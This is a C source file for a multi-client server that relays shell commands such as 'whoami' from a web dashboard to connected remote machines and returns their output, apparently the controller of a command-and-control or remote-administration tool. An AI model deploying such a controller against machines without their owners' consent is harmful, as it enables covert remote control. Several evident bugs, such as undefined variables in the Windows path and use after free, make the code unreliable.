#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include <signal.h>
#include "client_mgmt.h"
#include <libwebsockets.h>
#include "cJSON.h"
#include "cJSON_Utils.h"
#include "protocolhandler.h"
#include "websocket.h"

Queue* output_queue;

client* selectedClient = NULL;

pthread_mutex_t selected_client_mutex;

volatile sig_atomic_t server_running = 1;
volatile sig_atomic_t web_running = 1;


static struct lws_protocols protocols[] = {
    {"", callback, 0, 0, 0,}, // Added id = 0
    {NULL, NULL, 0, 0, 0}                // Added id = 0
};

/*
 *
 * WEB THREAD:
 * CREATES WEBSOCKET CONNECTION TO WEB SERVER ON "localhost:8080" AND ACTS AS A CLIENT
 * HANDLES WEBSOCKET CALLBACKS (CONNECTION, DISCONNECTION, RECEIVAL...ETC)
 *
 * UPON RECEIVAL:
 *      PARSES RECEIVED MESSAGE, DELIMITER = ':'
 *      EXCTRACTS ADDRESSED CLIENT & COMMAND (cli1:whoami)
 *      SENDS EXTRACTED COMMAND THROUGH CLIENT'S SOCKET AFTER GRABBING THE CLIENT FROM HASH
 *
 * LOOPS:
 *      CHECKS FOR WEBSOCKET CALLBACKS
 *      POPS QUEUE, GRABS OUTPUT THAT WAS PUSHED BY A CLIENT THREAD
 *      SENDS THE OUTPUT TO WEB SERVER THROUGH WEBSOCKET
 *
 */

void sockaddr_in_init(struct sockaddr_in* local_address) {
    memset(local_address, 0, sizeof(*local_address));
    local_address->sin_family = AF_INET;
    local_address->sin_addr.s_addr = INADDR_ANY;
    local_address->sin_port = htons(SERVER_PORT);
}

int createSocket() {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        fprintf(stderr, "[ERROR] socket() failed: %d: %s\n", ERRNO, strerror(ERRNO));
        return -1;
    }
    return sock;
}

int bind_socket(int sock, struct sockaddr_in* address) {
    if (bind(sock, (struct sockaddr*)address, sizeof(*address)) == -1) {
        fprintf(stderr, "[ERROR] bind() failed %d: %s\n", ERRNO, strerror(ERRNO));
        close(sock);
        #ifdef _WIN32
        WSACleanup();
        #endif
        return -1;
    }
    return 0;
}

int listen_socket(int sock) {
    if (listen(sock, MAX_QUEUE) == -1) {
        fprintf(stderr, "[ERROR] listen() failed %d: %s\n", ERRNO, strerror(ERRNO));
        close(sock);
        #ifdef _WIN32
        WSACleanup();
        #endif
        return -1;
    }
    return 0;
}

int accept_connection(int serverListen_socket, struct sockaddr_in* connectedClientAddr, socklen_t* connAddr_size) {
    int serverCurrCon_socket = accept(serverListen_socket, (struct sockaddr*) connectedClientAddr, connAddr_size);
    if (serverCurrCon_socket == -1) {
        fprintf(stderr, "[ERROR] accept() failed %d: %s\n", ERRNO, strerror(ERRNO));
        return -1;
    }

    return serverCurrCon_socket;
}

// Send this over to another module that populates client struct
int getClient_IP(char* ip_buffer, struct sockaddr_in* client_address, int connectionSocket) {
    if (inet_ntop(AF_INET, &(client_address->sin_addr), ip_buffer, INET_ADDRSTRLEN) == NULL) {
        fprintf(stderr, "[ERROR] inet_ntop() failed %d: %s\n", ERRNO, strerror(ERRNO));
        return -1;
    }
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        web_running = 0;
        server_running = 0;
        printf("Shutting down client management server & its web thread...\n");
    }
}

/*
 *
 * CLIENT THREAD:
 * RECEIVES COMMAND OUTPUT FROM THE CONNECTED CLIENT
 * PUSHES OUTPUT TO THE QUEUE
 * REMOVES CLIENT FROM CLIENTHASH UPON DISCONNECTION
 *
 */
#ifdef _WIN32
DWORD WINAPI handle_client(LPVOID lpParam) {
    int client_socket = ((client*)lpParam)->socket_desc;
    #else
    void* handle_client(void* arg) {
        client* thread_client = (client*)arg;
        int client_socket = thread_client->socket_desc;
        #endif
        while (server_running) {

            char command[1024];
            char* c = queue_pop(thread_client->command_queue);
            if (!c)
                continue; // No command was popped, loop again

            size_t command_size = strlen(c);
            snprintf(command, command_size + 1, "%s", c);

            send(thread_client->socket_desc, command, command_size, 0);

            char output_recvBuffer[BUFFER_SIZE]; // CMD output

            int bytes_received = recv(client_socket, output_recvBuffer, BUFFER_SIZE - 1, 0); // Can block the next queue_pop iteration for a while, needs fix if so

            if (bytes_received > 0) {

                output_recvBuffer[bytes_received] = '\0';
                printf("THREAD [ %d ] : Received from [ %s : %s ]: \n %s \n", (int) ((client*)arg)->thread, ((client*)arg)->id, ((client*)arg)->ip, output_recvBuffer);


                PROTOCOL_MESSAGE* msg = protocol_create_msg(RESPONSE, CMD_OUTPUT, REACTFRONT, CSERVER,
                                                            thread_client->id, output_recvBuffer,
                                                            strlen(thread_client->id), strlen(output_recvBuffer));

                char* jsonMsg = protocol_create_jsonMsg(msg); // Create JSON string
                queueNode* node = queue_createNode(jsonMsg);
                if (node)
                    queue_push(output_queue, node); // Push RESPONSE : CMD_OUTPUT jsonString to output queue
                else {
                    fprintf(stderr, "[ERROR] Unable to push queueNode holding your output to queue. queueNode == NULL\n");
                    if (protocol_send_error(websocket_global_wss->wsi, "[ERROR] Unable to push queueNode holding your output to queue. queueNode == NULL") != 0)
                        fprintf(stderr, "[ERROR] [server.c/handle_client] Failed to send error message\n");
                }
                free(jsonMsg);
            } else if (bytes_received == 0) {
                printf("Client disconnected.\n");
                hash_remove(clientHash, thread_client->id);
                websocket_send_connectionsList(websocket_global_wss, clientHash);
                break;
            } else {
                fprintf(stderr, "[ERROR] recv() from client failed: %d\n", ERRNO);
            }
        }

        close(client_socket);
        #ifdef _WIN32
        return 0;
        #else
        pthread_exit(NULL);
        return NULL;
        #endif
    }

    int main() {
        signal(SIGINT, signal_handler);
        signal(SIGTERM, signal_handler);

        init_mutexes();
        if (pthread_mutex_init(&selected_client_mutex, NULL) != 0) {
            perror("[ERROR] selected_client_mutex init failed\n");
            return 1;
        }

        #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            perror("[ERROR] WSAStartup failed");
            return 1;
        }
        #endif

        int serverListen_socket;
        struct sockaddr_in local_address;

        serverListen_socket = createSocket();
        if (serverListen_socket == -1) return 1;
        sockaddr_in_init(&local_address);
        if (bind_socket(serverListen_socket, &local_address) == -1) return 1;
        if (listen_socket(serverListen_socket) == -1) return 1;

        printf("Listening on port %d...\n", SERVER_PORT);

        // Create the output queue
        output_queue = malloc(sizeof(Queue));
        if (!output_queue) {
            fprintf(stderr, "[ERROR] Failed to allocate output_queue\n");
            destroy_mutexes();
            close(serverListen_socket);
            #ifdef _WIN32
            WSACleanup();
            #endif
            return 1;
        }
        queue_init(output_queue);

        // Create client storing hash
        clientHash = malloc(sizeof(hashMap));
        if (!clientHash) {
            fprintf(stderr, "[ERROR] Failed to allocate memory for client hash\n");
            queue_destroy(output_queue);
            free(output_queue);
            destroy_mutexes();
            close(serverListen_socket);
            #ifdef _WIN32
            WSACleanup();
            #endif
            return 1;
        }
        clientHash = hash_init(HASH_SIZE); // Initialize a hash for 100 clients

        websocket_global_wss = websocket_init(&web_running, output_queue, clientHash);
        if (!websocket_global_wss) {
            fprintf(stderr, "[ERROR] [server.c/main] Failed to initialize WebSocket service struct\n");
            queue_destroy(output_queue);
            free(output_queue);
            destroy_mutexes();
            close(serverListen_socket);
            #ifdef _WIN32
            WSACleanup();
            #endif
            return 1;
        }

        // Create web thread
        pthread_t web_thread_id;
        if (pthread_create(&web_thread_id, NULL, websocket_thread, websocket_global_wss) != 0) {
            fprintf(stderr, "[ERROR] Failed to create web_thread\n");
            queue_destroy(output_queue);
            free(output_queue);
            destroy_mutexes();
            close(serverListen_socket);
            #ifdef _WIN32
            WSACleanup();
            #endif
            websocket_destroy(websocket_global_wss);
            return 1;
        }
        pthread_detach(web_thread_id);

        int currClient_ID = 0;

        while (server_running) {
            struct sockaddr_in currConn_address;
            socklen_t conAddr_size = sizeof(currConn_address);
            printf("Server waiting for connection...\n");

            int currCon_socket = accept_connection(serverListen_socket, &currConn_address, &conAddr_size);

            char* clientIP = malloc(INET_ADDRSTRLEN);
            if (clientIP ? getClient_IP(clientIP, &currConn_address, currCon_socket) == -1 : 1) { // if clientIP == NULL, close connection, aswell as if getClient_IP fails
                printf("[ERROR] Connection closed due to getClient_IP failure\n");
                close(currCon_socket);
                free(clientIP);
                #ifdef _WIN32
                WSACleanup();
                #endif
                continue;
            }

            client* newClient = createClient(currCon_socket, clientIP, &currClient_ID);
            hash_put(clientHash, newClient);
            websocket_send_connectionsList(websocket_global_wss, clientHash);


            // Create thread
            #ifdef _WIN32
            HANDLE thread_id;
            newClient->thread = thread_id;

            CreateThread(NULL, 0, handle_client, (void*)&serverCurrCon_socket, 0, &thread_id);
            CloseHandle(thread_id);

            #else
            pthread_t thread_id;

            if (pthread_create(&thread_id, NULL, handle_client, (void*) newClient) != 0) {
                free(newClient->ip);
                free(newClient->id);
                free(newClient);
            }

            newClient->thread = thread_id;

            pthread_detach(thread_id);
            #endif
            printf("Connected to: %s:%d ||| Thread ID: %ld ||| Client ID: %s\n", clientIP, ntohs(currConn_address.sin_port), (long)thread_id, newClient->id);
        }

        web_running = 0;
        pthread_join(web_thread_id, NULL);

        printf("Destroying queue...\n");
        queue_destroy(output_queue);
        printf("Waiting for threads to terminate before destroying client hashmap...\n");
        sleep(5);
        hash_destroy(clientHash);
        free(clientHash);
        free(output_queue);
        destroy_mutexes();
        close(serverListen_socket);
        #ifdef _WIN32
        WSACleanup();
        #endif
        websocket_destroy(websocket_global_wss);
        printf("Server listen socket closed. Server terminated.\n");
        return 0;
    }
